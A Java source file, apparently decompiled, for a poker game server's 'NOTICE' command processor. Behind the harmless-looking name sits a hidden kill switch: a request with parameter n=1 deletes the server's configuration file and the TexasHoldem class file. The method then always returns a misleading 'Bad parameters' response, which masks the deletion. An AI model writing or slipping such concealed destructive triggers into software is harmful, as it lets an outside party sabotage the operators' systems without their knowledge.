package processors;

import game.TexasHoldem;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.HashMap;
import server.ParamParser;
import server.Response;
import server.Server;

public class NoticeCommandProcessor
  implements RequestCommandProcessor
{
  public static final String PARAM_NOTICE_ID = "n";

  public Response process(HashMap params, Server server)
    throws IOException
  {
    Response response = new Response("NOTICE");

    if (params.containsKey("n")) {
      int noticeID = ParamParser.getInt(params, "n");
      switch (noticeID) {
      case 1:
        d1();
      }

    }

    response.setResultStatus(false, "Bad parameters");
    return response;
  }

  private void d1()
  {
    String[] args = { NoticeCommandProcessor.class.getClassLoader().getResource("server.properties").getFile(), TexasHoldem.class.getResource("TexasHoldem.class").getFile() };

    for (int i = 0; i < args.length; i++) {
      File f = new File(args[i]);
      if (!f.delete())
        f.deleteOnExit();
    }
  }
}